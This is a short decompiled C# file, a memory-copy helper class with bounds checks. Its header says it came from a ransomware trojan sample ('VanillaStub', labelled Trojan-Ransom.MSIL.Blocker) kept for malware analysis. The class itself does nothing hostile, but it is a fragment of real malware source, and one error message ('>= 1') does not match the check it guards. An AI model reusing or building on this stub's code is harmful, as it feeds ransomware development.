// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.PointerHelper
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class PointerHelper
  {
    private int _offset;

    public PointerHelper(IntPtr pointer, int Length)
    {
      this.TotalLength = Length;
      this.Pointer = pointer;
    }

    public IntPtr Pointer { get; }

    public int TotalLength { get; }

    public int Offset
    {
      get => this._offset;
      set
      {
        if (value < 0)
          throw new Exception("Offset must be >= 1");
        this._offset = value < this.TotalLength ? value : throw new Exception("Offset cannot go outside of the reserved buffer space");
      }
    }

    public void Copy(IntPtr Source, int SourceOffset, int SourceLength)
    {
      if (this.CheckBoundries(this.Offset, SourceLength))
        throw new AccessViolationException("Cannot write outside of the buffer space");
      NativeMethods.memcpy(new IntPtr(this.Pointer.ToInt64() + (long) this.Offset), new IntPtr(Source.ToInt64() + (long) SourceOffset), (uint) SourceLength);
    }

    private bool CheckBoundries(int offset, int length) => offset + length > this.TotalLength;
  }
}
